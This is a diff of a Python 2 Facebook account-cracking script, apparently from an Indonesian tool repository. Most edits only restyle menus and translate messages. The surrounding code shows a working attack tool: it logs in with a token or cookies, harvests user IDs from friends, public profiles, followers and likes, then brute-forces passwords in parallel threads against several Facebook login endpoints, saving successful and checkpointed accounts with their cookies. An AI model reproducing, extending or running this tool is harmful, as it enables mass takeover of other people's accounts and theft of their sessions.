@@ -117,10 +117,10 @@ def komen(): # Boleh Di Tanbahin Jangan Di Ganti #
 def login():
     os.system('clear')
     print logo
-    print ('\033[1;91m╔══════════•ೋೋ•══════════╗')
-    print " \033[1;91m [A] \033[1;92mLogin Using Token"
-    print " \033[1;91m [B] \033[1;92mLogin Using Cookies"
-    print ('\033[1;91m╚══════════•ೋೋ•══════════╝')
+    print ('\033[1;91m╔═════════•ೋೋ•═════════╗')
+    print " \033[1;91m  [A] \033[1;92mLogin Using Token"
+    print " \033[1;91m  [B] \033[1;92mLogin Using Cookies"
+    print ('\033[1;91m╚═════════•ೋೋ•═════════╝')
     lg = raw_input('\n\033[0;91m [•] choose : ')
     if lg == '':
         os.sys.exit()
@@ -208,19 +208,19 @@ def menu():
   os.system("clear")
   print logo
   print ('\033[1;91m╔═════════════•ೋೋ•══════════════╗')
-  print (' \033[0;91m [•] Nama : \033[0;92m'+nm)
-  print (' \033[0;91m [•]   Id : \033[0;93m'+id)
-  print (' \033[0;91m [•] DOB  : \033[0;92m'+tl)
+  print ('\033[0;91m  [•] Nama : \033[0;92m'+nm)
+  print ('\033[0;91m  [•]    ID     : \033[0;92m'+id)
+  print ('\033[0;91m  [•]  DOB   : \033[0;92m'+tl)
   print ('\033[1;91m╚═════════════•ೋೋ•══════════════╝')
   
-  print ('\033[1;91m╔════════════•ೋೋ•═════════════╗')
-  print ('\n\033[0;91m [1] \033[0;92mCrack ID From Friends')
-  print (' \033[0;91m  [2] \033[0;92mCrack ID From Public')
-  print (' \033[0;91m  [3] \033[0;92mCrack ID From Followers')
-  print (' \033[0;91m  [4] \033[0;92mCrack ID From Like')
-  print (' \033[0;91m  [5] \033[0;92mView Crack Results')
-  print (' \033[0;91m  [0] \033[0;92mDelete Token/Cookies')
-  print ('\033[1;91m╚════════════•ೋೋ•═════════════╝')
+  print ('\033[1;91m╔══════════•ೋೋ•═══════════╗')
+  print ('\n\033[0;91m[1] \033[0;92mCrack ID From Friends')
+  print (' \033[0;91m   [2] \033[0;92mCrack ID From Public')
+  print (' \033[0;91m   [3] \033[0;92mCrack ID From Followers')
+  print (' \033[0;91m   [4] \033[0;92mCrack ID From Like')
+  print (' \033[0;91m   [5] \033[0;92mView Crack Results')
+  print (' \033[0;91m   [0] \033[0;92mDelete Token/Cookies')
+  print ('\033[1;91m╚══════════•ೋೋ•═══════════╝')
   mn=raw_input(" \033[0;91m [•]choose : ")
   if mn=="":
 	print (' \033[0;91m [•]Fill it Correctly')
@@ -237,7 +237,7 @@ def menu():
     print ('\n\033[0;91m[1] See Results Ok')
     print ('\033[0;91m    [2] View Cp . Results')
     print ('\033[0;91m    [0] Return\n')
-    hs = raw_input(' \033[0;91m [•] Choose : ')
+    hs = raw_input(' \033[0;91m[•] Choose : ')
     if hs == '':
         menu()
     elif hs == '1' or hs == '01':
@@ -304,7 +304,7 @@ def teman():
                 for a in z['data']:
                         id.append(a['id']+"<=>"+a['name'])
                         ys.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r \033[0;92m collect  %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+                        print("\r \033[0;92m[•] collect  %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                 ys.close()
                 os.rename(qq,file)
 		print " "
@@ -312,14 +312,14 @@ def teman():
                 metode()
 
         except requests.exceptions.ConnectionError:
-		print (' \033[0;91m [•] Tidak Ada Koneksi')
+		print (' \033[0;91m [•] No Connection')
 		os.sys.exit()
 ##### CRACK FOLLOWERS #####
 def followers():
         try:
                 toket=open('login.txt','r').read()
         except IOError:
-		print (' *! Token Invalid')
+		print (' \033[0;91m[•]Token Invalid')
                 os.system('rm -rf login.txt')
                 time.sleep(0.01)
                 loginn()
@@ -405,7 +405,7 @@ def publik():
 		time.sleep(0.01)
 		loginn()
 	try:
-		idt = raw_input("\n \033[0;92m[•]Profil ID : ")
+		idt = raw_input("\n\033[0;92m[•]Profil ID : ")
 		limit = '5000'
 		file = 'dump.txt'
 		try:
@@ -422,12 +422,12 @@ def publik():
 		qq = ('pblk.txt').replace(" ","_")
 		ys = open(qq , 'w')#.replace(" ","_")
 		for a in z['friends']['data']:
-			id.append(a['id']+"<=>"+a['\033[0;92mname'])
-			ys.write(a['id']+"<=>"+a['\033[0;92mname']+'\n')
+			id.append(a['id']+"<=>"+a['name'])
+			ys.write(a['id']+"<=>"+a['name']+'\n')
 			print("\r \033[0;92m [•]Gather %s ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
 		ys.close()
 		os.rename(qq,file)
-		print("\r\033[0;92m [•] ID : m%s          "%(len(id)))
+		print("\r\033[0;92m [•] ID : %s          "%(len(id)))
 		metode()
 		
 	except Exception as e:
@@ -529,12 +529,12 @@ def free(em,pas,hosts):
 		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
 	else:return {"status":"error","email":em,"pass":pas}
 def metode():
-    print ('\033[1;91m╔══════════•ೋೋ•══════════╗')
+	print ('\033[1;91m╔═════════•ೋೋ•═════════╗')
     print ('\n\033[0;91m [1] \033[0;92mLogin mbasic.facebook')
-    print (' \033[0;91m  [2] \033[0;92mLogin m.facebook')
-    print (' \033[0;91m  [3] \033[0;92mLogin free.facebook')
-    print ('\033[1;91m╚══════════•ೋೋ•══════════╝')
-    md = raw_input('\033[0;91m[•]Choose : ')
+    print (' \033[0;91m    [2] \033[0;92mLogin m.facebook')
+    print (' \033[0;91m    [3] \033[0;92mLogin free.facebook')
+    print ('\033[1;91m╚═════════•ೋೋ•═════════╝')
+    md = raw_input(' *-> Input : ')
     if md == '':
         os.sys.exit()
     elif md == '1' or md == '01':
@@ -613,7 +613,7 @@ class crack:
 					print(' \033[0;91m[•]Invalid File')
 					menu()
 					continue
-				print('\033[0;91═══════════════════•ೋೋ•═══════════════════')
+				print(' \033[0;91═══════════════════•ೋೋ•═══════════════════')
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				print ('\n\033[0;92m [•]Finished*')
@@ -625,7 +625,7 @@ class crack:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print('\n\033[0;91m═══════════════════•ೋೋ•═══════════════════')
+			print('\n \033[0;91m╔═══════════════════•ೋೋ•═══════════════════╗')
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			print ('\n\033[0;92m[•]Finished*')
